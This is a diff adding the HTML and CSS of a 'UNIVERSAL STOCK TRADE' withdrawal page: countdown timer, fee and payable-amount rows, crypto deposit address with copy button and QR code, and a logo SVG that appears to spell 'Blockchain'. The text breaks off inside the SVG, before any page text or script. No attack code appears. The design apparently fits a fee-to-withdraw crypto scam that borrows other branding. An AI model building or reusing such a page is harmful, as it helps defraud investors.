@@ -1,0 +1,1194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+  <meta name="theme-color" content="#0b0821">
+  <title>UNIVERSAL STOCK TRADE • Withdrawal</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Inter', Roboto, 'Helvetica Neue', sans-serif;
+      background: #0b0821;
+      color: #ffffff;
+      min-height: 100vh;
+      padding: 0;
+      line-height: 1.5;
+    }
+
+    .navbar {
+      background: #0b0821;
+      border-bottom: 1px solid #1a0b2e;
+      padding: 0 16px;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+
+    .nav-container {
+      max-width: 1280px;
+      margin: 0 auto;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      height: 56px;
+    }
+
+    .logo {
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+    }
+
+    .nav-logo-svg {
+      height: 32px;
+      width: auto;
+    }
+
+    .nav-links {
+      display: flex;
+      gap: 20px;
+      align-items: center;
+    }
+
+    .nav-links a {
+      color: #9ea1a8;
+      text-decoration: none;
+      font-size: 13px;
+      font-weight: 500;
+      transition: color 0.2s;
+      cursor: pointer;
+      white-space: nowrap;
+    }
+
+    .nav-links a:hover {
+      color: #ffffff;
+    }
+
+    @keyframes float {
+      0% { transform: translateY(0px); }
+      50% { transform: translateY(-15px); }
+      100% { transform: translateY(0px); }
+    }
+
+    @keyframes glowPulse {
+      0% { filter: drop-shadow(0 0 15px rgba(218, 18, 62, 0.2)); }
+      50% { filter: drop-shadow(0 0 35px rgba(218, 18, 62, 0.6)); }
+      100% { filter: drop-shadow(0 0 15px rgba(218, 18, 62, 0.2)); }
+    }
+
+    @keyframes shadowScale {
+      0%, 100% { transform: scale(1); opacity: 0.3; }
+      50% { transform: scale(0.7); opacity: 0.1; }
+    }
+
+    .visual-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+      padding: 30px 0 15px;
+      background: linear-gradient(180deg, #0b0821 0%, #1a0b2e 100%);
+    }
+
+    .blockchain-logo {
+      width: 160px;
+      animation: float 4s ease-in-out infinite, glowPulse 4s ease-in-out infinite;
+    }
+
+    .shadow {
+      position: absolute;
+      bottom: 5px;
+      width: 100px;
+      height: 15px;
+      background: rgba(218, 18, 62, 0.15);
+      border-radius: 50%;
+      filter: blur(8px);
+      animation: shadowScale 4s ease-in-out infinite;
+    }
+
+    .container {
+      max-width: 600px;
+      margin: 0 auto;
+      padding: 20px 16px 40px;
+    }
+
+    .page-container {
+      display: none;
+      max-width: 600px;
+      margin: 0 auto;
+      padding: 20px 16px 40px;
+    }
+
+    .card {
+      background: rgba(26, 11, 46, 0.6);
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(218, 18, 62, 0.2);
+      border-radius: 20px;
+      padding: 18px;
+      margin-bottom: 16px;
+      transition: border-color 0.2s;
+    }
+
+    .timer-card {
+      background: rgba(26, 11, 46, 0.6);
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(218, 18, 62, 0.2);
+      border-radius: 20px;
+      padding: 16px;
+      margin-bottom: 16px;
+    }
+
+    .timer-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: baseline;
+      margin-bottom: 12px;
+      flex-wrap: wrap;
+    }
+
+    .timer-label {
+      color: #9ea1a8;
+      font-size: 12px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .timer-value {
+      font-size: 32px;
+      font-family: monospace;
+      font-weight: 700;
+      color: #DA123E;
+      letter-spacing: 1px;
+    }
+
+    .progress-track {
+      height: 4px;
+      background: #1a0b2e;
+      border-radius: 4px;
+      overflow: hidden;
+    }
+
+    .progress-fill {
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, #0c6cf2, #DA123E);
+      border-radius: 4px;
+      transition: width 0.3s linear;
+    }
+
+    .timer-note {
+      font-size: 10px;
+      color: #6a6d75;
+      margin-top: 10px;
+    }
+
+    .summary-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 10px 0;
+      border-bottom: 1px solid rgba(218, 18, 62, 0.15);
+      flex-wrap: wrap;
+    }
+
+    .summary-label {
+      color: #9ea1a8;
+      font-size: 13px;
+    }
+
+    .summary-value {
+      font-weight: 500;
+      color: white;
+      font-size: 13px;
+    }
+
+    .fee-value {
+      color: #DA123E;
+      font-weight: 600;
+    }
+
+    .payable-row {
+      border-top: 1px solid rgba(218, 18, 62, 0.3);
+      border-bottom: none;
+      margin-top: 6px;
+      padding-top: 12px;
+    }
+
+    .payable-label {
+      font-weight: 600;
+      font-size: 14px;
+    }
+
+    .payable-amount {
+      font-size: 22px;
+      font-weight: 700;
+      color: #DA123E;
+    }
+
+    .explanation-box {
+      background: rgba(26, 11, 46, 0.6);
+      backdrop-filter: blur(10px);
+      border-left: 3px solid #DA123E;
+      border-radius: 16px;
+      padding: 16px;
+      margin-bottom: 16px;
+    }
+
+    .explanation-title {
+      font-weight: 600;
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 14px;
+      color: #DA123E;
+    }
+
+    .explanation-text {
+      font-size: 12px;
+      color: #b8b9be;
+      margin-bottom: 10px;
+      line-height: 1.5;
+    }
+
+    .gateway-option {
+      background: rgba(11, 8, 33, 0.8);
+      border: 1px solid #DA123E;
+      border-radius: 18px;
+      padding: 14px;
+      margin-bottom: 12px;
+    }
+
+    .gateway-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .gateway-info {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      flex-wrap: wrap;
+    }
+
+    .gateway-name {
+      font-weight: 600;
+      font-size: 14px;
+    }
+
+    .gateway-network {
+      font-size: 10px;
+      background: #1a0b2e;
+      padding: 2px 8px;
+      border-radius: 40px;
+      color: #9ea1a8;
+    }
+
+    .gateway-address {
+      font-family: monospace;
+      font-size: 10px;
+      color: #b8b9be;
+      margin-top: 8px;
+      word-break: break-all;
+    }
+
+    .check-icon {
+      color: #10b981;
+    }
+
+    .address-box {
+      background: rgba(11, 8, 33, 0.8);
+      border: 1px solid rgba(218, 18, 62, 0.2);
+      border-radius: 14px;
+      padding: 12px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin: 14px 0;
+      gap: 8px;
+      flex-wrap: wrap;
+    }
+
+    .address-code {
+      font-family: monospace;
+      font-size: 11px;
+      color: #b8b9be;
+      word-break: break-all;
+    }
+
+    .copy-btn {
+      background: #1a0b2e;
+      border: none;
+      padding: 6px 12px;
+      border-radius: 12px;
+      cursor: pointer;
+      color: #DA123E;
+      font-size: 12px;
+    }
+
+    .qr-wrapper {
+      display: flex;
+      justify-content: center;
+      margin-top: 14px;
+    }
+
+    .qr-image {
+      background: white;
+      padding: 6px;
+      border-radius: 16px;
+      width: 110px;
+      height: 110px;
+    }
+
+    .input-group {
+      margin-bottom: 16px;
+    }
+
+    .input-label {
+      font-size: 12px;
+      color: #9ea1a8;
+      margin-bottom: 6px;
+      display: block;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 12px 14px;
+      background: rgba(11, 8, 33, 0.8);
+      border: 1px solid rgba(218, 18, 62, 0.2);
+      border-radius: 14px;
+      color: white;
+      font-size: 13px;
+    }
+
+    .input-field:focus {
+      outline: none;
+      border-color: #0c6cf2;
+    }
+
+    .warning-card {
+      background: rgba(26, 11, 46, 0.6);
+      border: 1px solid rgba(218, 18, 62, 0.3);
+      border-radius: 18px;
+      padding: 14px;
+      margin-bottom: 20px;
+    }
+
+    .warning-content {
+      display: flex;
+      gap: 10px;
+    }
+
+    .warning-icon {
+      color: #DA123E;
+      font-size: 18px;
+    }
+
+    .warning-title {
+      color: #DA123E;
+      font-size: 12px;
+      font-weight: 600;
+    }
+
+    .warning-text {
+      font-size: 11px;
+      color: #b8b9be;
+      margin-top: 3px;
+    }
+
+    .button-group {
+      display: flex;
+      gap: 10px;
+      margin-top: 8px;
+      flex-wrap: wrap;
+    }
+
+    .btn-outline {
+      flex: 1;
+      background: transparent;
+      border: 1px solid rgba(218, 18, 62, 0.5);
+      padding: 12px 16px;
+      border-radius: 40px;
+      color: #DA123E;
+      font-weight: 500;
+      cursor: pointer;
+      transition: all 0.2s;
+      text-align: center;
+      font-size: 13px;
+    }
+
+    .btn-outline:hover {
+      border-color: #DA123E;
+      background: rgba(218, 18, 62, 0.1);
+    }
+
+    .btn-wallet {
+      flex: 1;
+      background: transparent;
+      border: 1px solid #0c6cf2;
+      padding: 12px 16px;
+      border-radius: 40px;
+      color: #0c6cf2;
+      font-weight: 500;
+      cursor: pointer;
+      transition: all 0.2s;
+      text-align: center;
+      font-size: 13px;
+    }
+
+    .btn-wallet:hover {
+      border-color: #DA123E;
+      background: rgba(12, 108, 242, 0.1);
+      color: #DA123E;
+    }
+
+    .btn-primary {
+      flex: 1;
+      background: linear-gradient(135deg, #0c6cf2, #DA123E);
+      border: none;
+      padding: 12px 16px;
+      border-radius: 40px;
+      color: white;
+      font-weight: 700;
+      cursor: pointer;
+      transition: opacity 0.2s;
+      text-align: center;
+      font-size: 13px;
+    }
+
+    .btn-primary:hover {
+      opacity: 0.9;
+    }
+
+    .footer-note {
+      text-align: center;
+      font-size: 10px;
+      color: #6a6d75;
+      margin-top: 24px;
+    }
+
+    .page-header {
+      margin-bottom: 20px;
+    }
+
+    .page-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: #1a0b2e;
+      padding: 5px 12px;
+      border-radius: 40px;
+      font-size: 11px;
+      color: #DA123E;
+      margin-bottom: 16px;
+    }
+
+    .page-header h1 {
+      font-size: 24px;
+      font-weight: 600;
+      color: white;
+      margin-bottom: 6px;
+      letter-spacing: -0.3px;
+    }
+
+    .page-header p {
+      color: #9ea1a8;
+      font-size: 13px;
+    }
+
+    .products-grid {
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    .product-card {
+      background: rgba(26, 11, 46, 0.6);
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(218, 18, 62, 0.2);
+      border-radius: 20px;
+      padding: 18px;
+      transition: all 0.2s;
+    }
+
+    .product-icon {
+      font-size: 28px;
+      margin-bottom: 10px;
+    }
+
+    .product-title {
+      font-size: 16px;
+      font-weight: 600;
+      color: #DA123E;
+      margin-bottom: 6px;
+    }
+
+    .product-description {
+      font-size: 12px;
+      color: #b8b9be;
+      line-height: 1.5;
+    }
+
+    .fee-badge, .time-badge {
+      display: inline-block;
+      background: rgba(218, 18, 62, 0.15);
+      padding: 4px 10px;
+      border-radius: 40px;
+      font-size: 10px;
+      color: #DA123E;
+      margin-top: 10px;
+      margin-right: 8px;
+    }
+
+    .crypto-icons {
+      display: flex;
+      gap: 8px;
+      margin-top: 12px;
+      flex-wrap: wrap;
+    }
+
+    .crypto-icon {
+      background: rgba(11, 8, 33, 0.8);
+      padding: 4px 10px;
+      border-radius: 40px;
+      font-size: 11px;
+      border: 1px solid rgba(218, 18, 62, 0.3);
+    }
+
+    .faq-item {
+      margin-bottom: 16px;
+      border-bottom: 1px solid rgba(218, 18, 62, 0.15);
+      padding-bottom: 14px;
+    }
+
+    .faq-question {
+      font-weight: 600;
+      color: #DA123E;
+      margin-bottom: 6px;
+      cursor: pointer;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 13px;
+      padding: 4px 0;
+    }
+
+    .faq-answer {
+      font-size: 12px;
+      color: #b8b9be;
+      line-height: 1.5;
+      display: none;
+      padding-right: 8px;
+    }
+
+    .faq-answer.show {
+      display: block;
+    }
+
+    .faq-toggle {
+      font-size: 12px;
+      transition: transform 0.2s;
+    }
+
+    .contact-item {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 12px;
+      background: rgba(11, 8, 33, 0.8);
+      border-radius: 14px;
+      margin-bottom: 10px;
+      border: 1px solid rgba(218, 18, 62, 0.2);
+      flex-wrap: wrap;
+    }
+
+    .contact-icon {
+      font-size: 22px;
+    }
+
+    .contact-details {
+      flex: 1;
+      min-width: 140px;
+    }
+
+    .contact-label {
+      font-size: 10px;
+      color: #9ea1a8;
+    }
+
+    .contact-value {
+      font-size: 13px;
+      font-weight: 500;
+      color: #DA123E;
+      word-break: break-all;
+    }
+
+    .copy-contact-btn {
+      background: rgba(218, 18, 62, 0.2);
+      border: none;
+      padding: 5px 12px;
+      border-radius: 20px;
+      color: #DA123E;
+      cursor: pointer;
+      font-size: 11px;
+    }
+
+    .learn-section-detailed {
+      background: rgba(11, 8, 33, 0.8);
+      border: 1px solid rgba(218, 18, 62, 0.2);
+      border-radius: 20px;
+      margin-bottom: 20px;
+      overflow: hidden;
+      padding: 18px;
+    }
+
+    .learn-section-detailed h4 {
+      color: #DA123E;
+      font-size: 15px;
+      margin: 18px 0 10px 0;
+      padding-bottom: 6px;
+      border-bottom: 1px solid rgba(218, 18, 62, 0.3);
+    }
+
+    .learn-section-detailed h4:first-of-type {
+      margin-top: 0;
+    }
+
+    .learn-section-detailed p {
+      font-size: 12px;
+      color: #b8b9be;
+      margin-bottom: 12px;
+      line-height: 1.6;
+    }
+
+    .learn-section-detailed ul {
+      margin: 10px 0 10px 20px;
+      color: #b8b9be;
+      font-size: 12px;
+    }
+
+    .method-table, .summary-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 14px 0;
+      font-size: 11px;
+      display: block;
+      overflow-x: auto;
+    }
+
+    .method-table th, .summary-table th,
+    .method-table td, .summary-table td {
+      border: 1px solid rgba(218, 18, 62, 0.2);
+      padding: 8px 10px;
+      text-align: left;
+      vertical-align: top;
+    }
+
+    .method-table th, .summary-table th {
+      background: rgba(218, 18, 62, 0.1);
+      color: #DA123E;
+      font-weight: 600;
+    }
+
+    .check-mark { color: #10b981; }
+    .cross-mark { color: #DA123E; }
+
+    hr {
+      border-color: rgba(218, 18, 62, 0.2);
+      margin: 16px 0;
+    }
+
+    .button-group-page {
+      margin-top: 24px;
+      text-align: center;
+    }
+
+    .back-btn {
+      background: transparent;
+      border: 1px solid rgba(218, 18, 62, 0.5);
+      padding: 10px 20px;
+      border-radius: 40px;
+      color: #DA123E;
+      cursor: pointer;
+      transition: all 0.2s;
+      font-size: 13px;
+    }
+
+    .back-btn:hover {
+      border-color: #DA123E;
+      background: rgba(218, 18, 62, 0.1);
+    }
+
+    .ticker-container {
+      margin-bottom: 20px;
+      border-radius: 14px;
+      overflow-x: auto;
+    }
+
+    @media (max-width: 480px) {
+      .nav-links {
+        gap: 14px;
+      }
+      .nav-links a {
+        font-size: 12px;
+      }
+      .button-group {
+        flex-direction: column;
+      }
+      .btn-outline, .btn-wallet, .btn-primary {
+        width: 100%;
+      }
+      .contact-item {
+        flex-direction: column;
+        text-align: center;
+      }
+      .copy-contact-btn {
+        width: 100%;
+      }
+      .address-box {
+        flex-direction: column;
+        text-align: center;
+      }
+      .timer-value {
+        font-size: 28px;
+      }
+      .payable-amount {
+        font-size: 20px;
+      }
+      .blockchain-logo {
+        width: 130px;
+      }
+      .nav-logo-svg {
+        height: 28px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="navbar">
+  <div class="nav-container">
+    <div class="logo" id="homeLogo">
+      <svg class="nav-logo-svg" viewBox="0 0 162 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <g clip-path="url(#clipNav0)">
+          <g clip-path="url(#clipNav1)">
+            <path d="M3.89999 7.00001L12 11L20.1 7.00001L14 0.900006C13.7 0.600006 12.92 0.100006 12 0.100006C11.08 0.100006 10.3 0.600006 9.99999 0.900006L3.89999 7.00001Z" fill="#BD0E4E"/>
+            <path d="M23 9.9L21.8 8.7L13.1 12.9V23.7C13.3 23.7 13.9 23.3 14.1 23.1C14.3 22.9 22.7 14.5333 23 14.2C23.3 13.8667 23.9 12.96 23.9 12C23.9 11.04 23.3 10.2 23 9.9Z" fill="#B40D2C"/>
+            <path d="M0.999993 9.9L2.19999 8.7L10.9 12.9V23.7C10.7 23.7 10.1 23.3 9.89999 23.1C9.69999 22.9 1.29999 14.5333 0.999993 14.2C0.699994 13.8667 0.0999937 12.96 0.0999937 12C0.0999937 11.04 0.699994 10.2 0.999993 9.9Z" fill="#DA123E"/>
+          </g>
+        </g>
+        <path d="M157.241 13.197C157.241 12.126 156.975 11.3475 156.444 10.8615C155.922 10.3665 155.216 10.119 154.325 10.119C153.767 10.119 153.267 10.245 152.826 10.497C152.385 10.74 152.034 11.082 151.773 11.523C151.512 11.955 151.382 12.45 151.382 13.008L150.464 12.8595C150.464 11.6535 150.72 10.623 151.233 9.768C151.746 8.913 152.394 8.256 153.177 7.797C153.96 7.329 154.761 7.095 155.58 7.095C156.552 7.095 157.407 7.302 158.145 7.716C158.892 8.13 159.477 8.742 159.9 9.552C160.332 10.353 160.548 11.334 160.548 12.495V21H157.241V13.197ZM148.061 7.5H151.382V21H148.061V7.5Z" fill="white"/>
+        <path d="M142.29 2L145.84 2V5.5H142.29V2ZM142.398 7.5H145.719V21H142.398V7.5Z" fill="white"/>
+        <path d="M139.073 7.5V18H140.333V21H138.766C137.109 21 135.766 19.6569 135.766 18V7.5H139.073ZM136.792 14.196C136.792 15.627 136.567 16.8825 136.117 17.9625C135.676 19.0335 135.05 19.866 134.24 20.46C133.439 21.054 132.499 21.351 131.419 21.351C130.285 21.351 129.29 21.054 128.435 20.46C127.589 19.866 126.928 19.0335 126.451 17.9625C125.983 16.8825 125.749 15.627 125.749 14.196C125.749 12.765 125.983 11.5185 126.451 10.4565C126.928 9.3945 127.589 8.571 128.435 7.986C129.29 7.392 130.285 7.095 131.419 7.095C132.499 7.095 133.439 7.392 134.24 7.986C135.05 8.571 135.676 9.3945 136.117 10.4565C136.567 11.5185 136.792 12.765 136.792 14.196ZM129.11 14.196C129.11 15.555 129.403 16.608 129.988 17.355C130.582 18.102 131.396 18.4755 132.431 18.4755C133.493 18.4755 134.312 18.102 134.888 17.355C135.473 16.608 135.766 15.555 135.766 14.196C135.766 12.855 135.473 11.8155 134.888 11.0775C134.312 10.3395 133.493 9.9705 132.431 9.9705C131.396 9.9705 130.582 10.3395 129.988 11.0775C129.403 11.8155 129.11 12.855 129.11 14.196Z" fill="white"/>
+        <path d="M120.373 13.197C120.373 12.126 120.108 11.3475 119.577 10.8615C119.055 10.3665 118.348 10.119 117.457 10.119C116.899 10.119 116.395 10.245 115.945 10.497C115.504 10.74 115.153 11.082 114.892 11.523C114.64 11.955 114.514 12.45 114.514 13.008L113.583 12.8595C113.592 11.6535 113.853 10.623 114.366 9.76801C114.879 8.91301 115.527 8.25601 116.31 7.79701C117.093 7.32901 117.894 7.09501 118.713 7.09501C119.685 7.09501 120.54 7.30201 121.278 7.71601C122.025 8.13001 122.61 8.74201 123.033 9.55201C123.465 10.353 123.681 11.334 123.681 12.495V21H120.373V13.197ZM111.22 2H114.514V21H111.193L111.22 2Z" fill="white"/>
+        <path d="M96.3403 14.196C96.3403 12.765 96.6193 11.5185 97.1773 10.4565C97.7353 9.3945 98.5138 8.571 99.5128 7.986C100.521 7.392 101.695 7.095 103.036 7.095C104.242 7.095 105.327 7.3245 106.29 7.7835C107.253 8.2425 108.022 8.8995 108.598 9.7545C109.174 10.6005 109.48 11.6175 109.516 12.8055H106.155C106.119 11.8695 105.817 11.163 105.25 10.686C104.683 10.209 103.945 9.9705 103.036 9.9705C101.983 9.9705 101.164 10.3395 100.579 11.0775C100.003 11.8155 99.7153 12.855 99.7153 14.196C99.7153 15.555 100.003 16.608 100.579 17.355C101.164 18.102 101.983 18.4755 103.036 18.4755C103.936 18.4755 104.67 18.2595 105.237 17.8275C105.804 17.3955 106.11 16.7475 106.155 15.8835H109.516C109.453 17.0355 109.134 18.021 108.558 18.84C107.982 19.65 107.217 20.271 106.263 20.703C105.309 21.135 104.233 21.351 103.036 21.351C101.704 21.351 100.534 21.054 99.5263 20.46C98.5273 19.866 97.7443 19.0335 97.1773 17.9625C96.6193 16.8825 96.3403 15.627 96.3403 14.196Z" fill="white"/>
+        <path d="M84.0549 2L87.4027 2L87.3759 21H84.0549L84.0549 2ZM93 7.5H97L91.2504 13.899L96.8934 21H92.9649L88.8204 15.7755L87.0789 17.8815L85.8774 15.573L93 7.5Z" fill="white"/>
+        <path d="M68.9047 14.196C68.9047 12.765 69.1837 11.5185 69.7417 10.4565C70.2997 9.3945 71.0782 8.571 72.0772 7.986C73.0852 7.392 74.2597 7.095 75.6007 7.095C76.8067 7.095 77.8912 7.3245 78.8542 7.7835C79.8172 8.2425 80.5867 8.8995 81.1627 9.7545C81.7387 10.6005 82.0447 11.6175 82.0807 12.8055H78.7192C78.6832 11.8695 78.3817 11.163 77.8147 10.686C77.2477 10.209 76.5097 9.9705 75.6007 9.9705C74.5477 9.9705 73.7287 10.3395 73.1437 11.0775C72.5677 11.8155 72.2797 12.855 72.2797 14.196C72.2797 15.555 72.5677 16.608 73.1437 17.355C73.7287 18.102 74.5477 18.4755 75.6007 18.4755C76.5007 18.4755 77.2342 18.2595 77.8012 17.8275C78.3682 17.3955 78.6742 16.7475 78.7192 15.8835H82.0807C82.0177 17.0355 81.6982 18.021 81.1222 18.84C80.5462 19.65 79.7812 20.271 78.8272 20.703C77.8732 21.135 76.7977 21.351 75.6007 21.351C74.2687 21.351 73.0987 21.054 72.0907 20.46C71.0917 19.866 70.3087 19.0335 69.7417 17.9625C69.1837 16.8825 68.9047 15.627 68.9047 14.196Z" fill="white"/>
+        <path d="M54.099 14.196C54.099 12.765 54.378 11.5185 54.936 10.4565C55.503 9.3945 56.2905 8.571 57.2985 7.986C58.3065 7.392 59.481 7.095 60.822 7.095C62.154 7.095 63.3195 7.392 64.3185 7.986C65.3265 8.571 66.1095 9.3945 66.6675 10.4565C67.2255 11.5185 67.5045 12.765 67.5045 14.196C67.5045 15.627 67.2255 16.8825 66.6675 17.9625C66.1095 19.0335 65.3265 19.866 64.3185 20.46C63.3195 21.054 62.154 21.351 60.822 21.351C59.481 21.351 58.3065 21.054 57.2985 20.46C56.2905 19.866 55.503 19.0335 54.936 17.9625C54.378 16.8825 54.099 15.627 54.099 14.196ZM64.1295 14.196C64.1295 12.855 63.837 11.8155 63.252 11.0775C62.676 10.3395 61.866 9.9705 60.822 9.9705C59.769 9.9705 58.9455 10.3395 58.3515 11.0775C57.7665 11.8155 57.474 12.855 57.474 14.196C57.474 15.555 57.7665 16.608 58.3515 17.355C58.9455 18.102 59.769 18.4755 60.822 18.4755C61.866 18.4755 62.676 18.102 63.252 17.355C63.837 16.608 64.1295 15.555 64.1295 14.196Z" fill="white"/>
+        <path d="M48.7734 2L52.1212 2V21H48.8002L48.7734 2Z" fill="white"/>
+        <path d="M40.895 2C41.9632 2 42.9024 2.20446 43.7127 2.61337C44.5322 3.02229 45.1676 3.58699 45.6188 4.30746C46.07 5.01819 46.2956 5.8555 46.2956 6.81937C46.2956 7.77351 46.0608 8.62542 45.5912 9.3751C45.1308 10.1248 44.5046 10.6895 43.7127 11.0692C44.7164 11.4586 45.5129 12.0915 46.1022 12.9677C46.7007 13.8342 47 14.8468 47 16.0054C47 16.9985 46.779 17.8698 46.337 18.6195C45.9042 19.3692 45.2919 19.9534 44.5 20.372C43.7081 20.7907 42.7873 21 41.7376 21H32V2H40.895ZM40.4945 5.08148H35.3978V9.81322H40.4945C41.2403 9.81322 41.8158 9.59416 42.221 9.15603C42.6262 8.70817 42.8287 8.11427 42.8287 7.37433C42.8287 6.66359 42.6262 6.10377 42.221 5.69485C41.8158 5.28593 41.2403 5.08148 40.4945 5.08148ZM40.7017 12.8801H35.3978V17.9331H40.9088C41.7007 17.9331 42.3315 17.7141 42.8011 17.2759C43.2799 16.8281 43.5193 16.2342 43.5193 15.4942C43.5193 14.6861 43.2615 14.0484 42.7459 13.5811C42.2394 13.1138 41.558 12.8801 40.7017 12.8801Z" fill="white"/>
+        <defs>
+          <clipPath id="clipNav0"><rect width="24" height="24" fill="white"/></clipPath>
+          <clipPath id="clipNav1"><rect width="24" height="24" fill="white"/></clipPath>
+        </defs>
+      </svg>
+    </div>
+    <div class="nav-links">
+      <a id="productsLink">Products</a>
+      <a id="resourcesLink">Resources</a>
+      <a id="learnLink">Learn</a>
+    </div>
+  </div>
+</div>
+
+<div id="withdrawalPage" class="container">
+  <div class="visual-container">
+    <svg class="blockchain-logo" viewBox="0 0 162 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <g clip-path="url(#clipLogo0)">
+        <g clip-path="url(#clipLogo1)">
+          <path d="M3.89999 7.00001L12 11L20.1 7.00001L14 0.900006C13.7 0.600006 12.92 0.100006 12 0.100006C11.08 0.100006 10.3 0.600006 9.99999 0.900006L3.89999 7.00001Z" fill="#BD0E4E"/>
+          <path d="M23 9.9L21.8 8.7L13.1 12.9V23.7C13.3 23.7 13.9 23.3 14.1 23.1C14.3 22.9 22.7 14.5333 23 14.2C23.3 13.8667 23.9 12.96 23.9 12C23.9 11.04 23.3 10.2 23 9.9Z" fill="#B40D2C"/>
+          <path d="M0.999993 9.9L2.19999 8.7L10.9 12.9V23.7C10.7 23.7 10.1 23.3 9.89999 23.1C9.69999 22.9 1.29999 14.5333 0.999993 14.2C0.699994 13.8667 0.0999937 12.96 0.0999937 12C0.0999937 11.04 0.699994 10.2 0.999993 9.9Z" fill="#DA123E"/>
+        </g>
+      </g>
+      <path d="M157.241 13.197C157.241 12.126 156.975 11.3475 156.444 10.8615C155.922 10.3665 155.216 10.119 154.325 10.119C153.767 10.119 153.267 10.245 152.826 10.497C152.385 10.74 152.034 11.082 151.773 11.523C151.512 11.955 151.382 12.45 151.382 13.008L150.464 12.8595C150.464 11.6535 150.72 10.623 151.233 9.768C151.746 8.913 152.394 8.256 153.177 7.797C153.96 7.329 154.761 7.095 155.58 7.095C156.552 7.095 157.407 7.302 158.145 7.716C158.892 8.13 159.477 8.742 159.9 9.552C160.332 10.353 160.548 11.334 160.548 12.495V21H157.241V13.197ZM148.061 7.5H151.382V21H148.061V7.5Z" fill="white"/>
+      <path d="M142.29 2L145.84 2V5.5H142.29V2ZM142.398 7.5H145.719V21H142.398V7.5Z" fill="white"/>
+      <path d="M139.073 7.5V18H140.333V21H138.766C137.109 21 135.766 19.6569 135.766 18V7.5H139.073ZM136.792 14.196C136.792 15.627 136.567 16.8825 136.117 17.9625C135.676 19.0335 135.05 19.866 134.24 20.46C133.439 21.054 132.499 21.351 131.419 21.351C130.285 21.351 129.29 21.054 128.435 20.46C127.589 19.866 126.928 19.0335 126.451 17.9625C125.983 16.8825 125.749 15.627 125.749 14.196C125.749 12.765 125.983 11.5185 126.451 10.4565C126.928 9.3945 127.589 8.571 128.435 7.986C129.29 7.392 130.285 7.095 131.419 7.095C132.499 7.095 133.439 7.392 134.24 7.986C135.05 8.571 135.676 9.3945 136.117 10.4565C136.567 11.5185 136.792 12.765 136.792 14.196ZM129.11 14.196C129.11 15.555 129.403 16.608 129.988 17.355C130.582 18.102 131.396 18.4755 132.431 18.4755C133.493 18.4755 134.312 18.102 134.888 17.355C135.473 16.608 135.766 15.555 135.766 14.196C135.766 12.855 135.473 11.8155 134.888 11.0775C134.312 10.3395 133.493 9.9705 132.431 9.9705C131.396 9.9705 130.582 10.3395 129.988 11.0775C129.403 11.8155 129.11 12.855 129.11 14.196Z" fill="white"/>
+      <path d="M120.373 13.197C120.373 12.126 120.108 11.3475 119.577 10.8615C119.055 10.3665 118.348 10.119 117.457 10.119C116.899 10.119 116.395 10.245 115.945 10.497C115.504 10.74 115.153 11.082 114.892 11.523C114.64 11.955 114.514 12.45 114.514 13.008L113.583 12.8595C113.592 11.6535 113.853 10.623 114.366 9.76801C114.879 8.91301 115.527 8.25601 116.31 7.79701C117.093 7.32901 117.894 7.09501 118.713 7.09501C119.685 7.09501 120.54 7.30201 121.278 7.71601C122.025 8.13001 122.61 8.74201 123.033 9.55201C123.465 10.353 123.681 11.334 123.681 12.495V21H120.373V13.197ZM111.22 2H114.514V21H111.193L111.22 2Z" fill="white"/>
+      <path d="M96.3403 14.196C96.3403 12.765 96.6193 11.5185 97.1773 10.4565C97.7353 9.3945 98.5138 8.571 99.5128 7.986C100.521 7.392 101.695 7.095 103.036 7.095C104.242 7.095 105.327 7.3245 106.29 7.7835C107.253 8.2425 108.022 8.8995 108.598 9.7545C109.174 10.6005 109.48 11.6175 109.516 12.8055H106.155C106.119 11.8695 105.817 11.163 105.25 10.686C104.683 10.209 103.945 9.9705 103.036 9.9705C101.983 9.9705 101.164 10.3395 100.579 11.0775C100.003 11.8155 99.7153 12.855 99.7153 14.196C99.7153 15.555 100.003 16.608 100.579 17.355C101.164 18.102 101.983 18.4755 103.036 18.4755C103.936 18.4755 104.67 18.2595 105.237 17.8275C105.804 17.3955 106.11 16.7475 106.155 15.8835H109.516C109.453 17.0355 109.134 18.021 108.558 18.84C107.982 19.65 107.217 20.271 106.263 20.703C105.309 21.135 104.233 21.351 103.036 21.351C101.704 21.351 100.534 21.054 99.5263 20.46C98.5273 19.866 97.7443 19.0335 97.1773 17.9625C96.6193 16.8825 96.3403 15.627 96.3403 14.196Z" fill="white"/>
+      <path d="M84.0549 2L87.4027 2L87.3759 21H84.0549L84.0549 2ZM93 7.5H97L91.2504 13.899L96.8934 21H92.9649L88.8204 15.7755L87.0789 17.8815L85.8774 15.573L93 7.5Z" fill="white"/>
